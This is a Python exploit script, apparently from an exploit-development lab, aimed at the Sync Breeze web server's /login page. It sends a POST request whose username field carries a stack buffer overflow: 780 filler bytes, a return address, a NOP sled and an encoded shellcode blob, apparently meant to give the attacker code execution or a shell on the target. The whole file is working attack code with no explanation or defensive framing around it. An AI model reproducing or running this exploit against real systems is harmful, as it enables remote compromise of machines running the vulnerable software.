#!/usr/bin/python3


import sys,socket
import time

print("*****Sync-Breeze*****")
ip_address=input("Enter the IP address\n")
port=input("Enter the port number\n")

if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*50)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*50)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*50)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*50)
        print("Issues with the user input")


elif (len(ip_address)>0) and (len(port)>0):
    print("*"*50)
    buf =  b""
    buf += b"\xbe\x33\xdf\xa1\xa0\xda\xc2\xd9\x74\x24\xf4\x5d"
    buf += b"\x33\xc9\xb1\x52\x83\xed\xfc\x31\x75\x0e\x03\x46"
    buf += b"\xd1\x43\x55\x54\x05\x01\x96\xa4\xd6\x66\x1e\x41"
    buf += b"\xe7\xa6\x44\x02\x58\x17\x0e\x46\x55\xdc\x42\x72"
    buf += b"\xee\x90\x4a\x75\x47\x1e\xad\xb8\x58\x33\x8d\xdb"
    buf += b"\xda\x4e\xc2\x3b\xe2\x80\x17\x3a\x23\xfc\xda\x6e"
    buf += b"\xfc\x8a\x49\x9e\x89\xc7\x51\x15\xc1\xc6\xd1\xca"
    buf += b"\x92\xe9\xf0\x5d\xa8\xb3\xd2\x5c\x7d\xc8\x5a\x46"
    buf += b"\x62\xf5\x15\xfd\x50\x81\xa7\xd7\xa8\x6a\x0b\x16"
    buf += b"\x05\x99\x55\x5f\xa2\x42\x20\xa9\xd0\xff\x33\x6e"
    buf += b"\xaa\xdb\xb6\x74\x0c\xaf\x61\x50\xac\x7c\xf7\x13"
    buf += b"\xa2\xc9\x73\x7b\xa7\xcc\x50\xf0\xd3\x45\x57\xd6"
    buf += b"\x55\x1d\x7c\xf2\x3e\xc5\x1d\xa3\x9a\xa8\x22\xb3"
    buf += b"\x44\x14\x87\xb8\x69\x41\xba\xe3\xe5\xa6\xf7\x1b"
    buf += b"\xf6\xa0\x80\x68\xc4\x6f\x3b\xe6\x64\xe7\xe5\xf1"
    buf += b"\x8b\xd2\x52\x6d\x72\xdd\xa2\xa4\xb1\x89\xf2\xde"
    buf += b"\x10\xb2\x98\x1e\x9c\x67\x0e\x4e\x32\xd8\xef\x3e"
    buf += b"\xf2\x88\x87\x54\xfd\xf7\xb8\x57\xd7\x9f\x53\xa2"
    buf += b"\xb0\x5f\x0b\xc8\xa6\x08\x4e\x10\x38\x59\xc7\xf6"
    buf += b"\x2c\x49\x8e\xa1\xd8\xf0\x8b\x39\x78\xfc\x01\x44"
    buf += b"\xba\x76\xa6\xb9\x75\x7f\xc3\xa9\xe2\x8f\x9e\x93"
    buf += b"\xa5\x90\x34\xbb\x2a\x02\xd3\x3b\x24\x3f\x4c\x6c"
    buf += b"\x61\xf1\x85\xf8\x9f\xa8\x3f\x1e\x62\x2c\x07\x9a"
    buf += b"\xb9\x8d\x86\x23\x4f\xa9\xac\x33\x89\x32\xe9\x67"
    buf += b"\x45\x65\xa7\xd1\x23\xdf\x09\x8b\xfd\x8c\xc3\x5b"
    buf += b"\x7b\xff\xd3\x1d\x84\x2a\xa2\xc1\x35\x83\xf3\xfe"
    buf += b"\xfa\x43\xf4\x87\xe6\xf3\xfb\x52\xa3\x14\x1e\x76"
    buf += b"\xde\xbc\x87\x13\x63\xa1\x37\xce\xa0\xdc\xbb\xfa"
    buf += b"\x58\x1b\xa3\x8f\x5d\x67\x63\x7c\x2c\xf8\x06\x82"
    buf += b"\x83\xf9\x02"

    size=b"A"* 780 + b"\x83\x0C\x09\x10" + b"C" * 4 + b"\x90" * 12 + buf 

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address,int(port)))

    buff=b"username=" + size + b"&password=A"


    buffer=b"POST /login HTTP/1.1\r\n"
    buffer+=b"Host: 192.168.100.215\r\n"
    buffer+=b"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n"
    buffer+=b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
    buffer+=b"Accept-Language: en-US,en;q=0.5\r\n"
    buffer+=b"Accept-Encoding: gzip, deflate\r\n"
    buffer+=b"Content-Type: application/x-www-form-urlencoded\r\n"
    buffer+=b"Content-Length: "+ str(len(buff)).encode('utf-8') + b"\r\n"
    buffer+=b"Origin: http://192.168.100.215\r\n"
    buffer+=b"Connection: keep-alive\r\n"
    buffer+=b"Referer: http://192.168.100.215/login\r\n"
    buffer+=b"\r\n"

    buffer=buffer+buff
    s.send((buffer))
